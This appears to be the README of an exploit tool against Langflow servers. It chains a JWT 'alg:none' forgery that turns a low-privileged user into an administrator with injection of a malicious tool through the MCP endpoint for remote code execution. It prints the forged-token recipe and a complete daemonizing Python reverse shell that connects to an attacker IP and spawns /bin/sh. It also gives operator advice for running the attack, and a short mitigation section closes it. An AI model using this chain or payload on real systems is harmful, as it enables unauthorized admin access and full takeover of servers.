# JWT Privilege Escalation & MCP Tool Injection Exploit

## Overview
This script automates a two-stage attack chain against vulnerable Langflow instances:
1.  **JWT `alg:none` Bypass**: Escalates from a low-privileged user to an administrator by forging an unsigned JWT token.
2.  **MCP Tool Injection**: Registers a malicious Python tool via the Model Context Protocol (MCP) endpoint to achieve Remote Code Execution (RCE).

## Vulnerability Context
*   **JWT `alg:none`**: The server trusts the `alg` field in the JWT header without validation. By setting `alg: none` and removing the signature, an attacker can forge arbitrary claims (e.g., `"role": "admin"`).
*   **MCP STDIO Injection**: The Langflow MCP implementation allows administrators to register custom tools with arbitrary Python code, which is executed on the server when the tool is called.

## Requirements
*   Python 3
*   `requests` library (`pip install requests`)
*   Valid low-privileged credentials for the target application.

## ⚠️ Critical Deployment Note
**This script must be executed ON THE TARGET MACHINE, not from your attacking Kali box.**
*   **Reason:** The reverse shell payload generated by the script connects back to the IP address of the machine *running the script*. If run from Kali, the target will attempt to connect back to itself or an internal interface, causing the connection to fail.
*   **Result:** Running it locally ensures the reverse shell connects from the target to your attacker IP correctly.

## Technical Details

### The `alg:none` Forge
The script constructs the token manually to bypass library safeguards:
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "<user>", "role": "admin"}
# Token format: base64(header).base64(payload).
```
The trailing dot `.` indicates an empty signature.

### The Reverse Shell Payload
The injected Python code uses `os.fork()` to daemonize the process, preventing the HTTP request from hanging and ensuring the shell survives:
```python
import socket,os,pty
pid=os.fork()
if pid>0: os._exit(0)
os.setsid()
pid=os.fork()
if pid>0: os._exit(0)
s=socket.socket()
s.connect(("<ATTACKER_IP>",9001))
[os.dup2(s.fileno(), i) for i in (0,1,2)]
pty.spawn("/bin/sh")
```

## Mitigation
*   **JWT**: Explicitly whitelist allowed algorithms (e.g., `HS256`, `RS256`) in your verification library. **Never** trust the `alg` header from the token itself. Explicitly reject `none`.
*   **MCP/Langflow**: Restrict access to `/api/v1/tools` and `/mcp` endpoints. Do not allow low-privileged users to register custom components. Sandbox code execution environments.
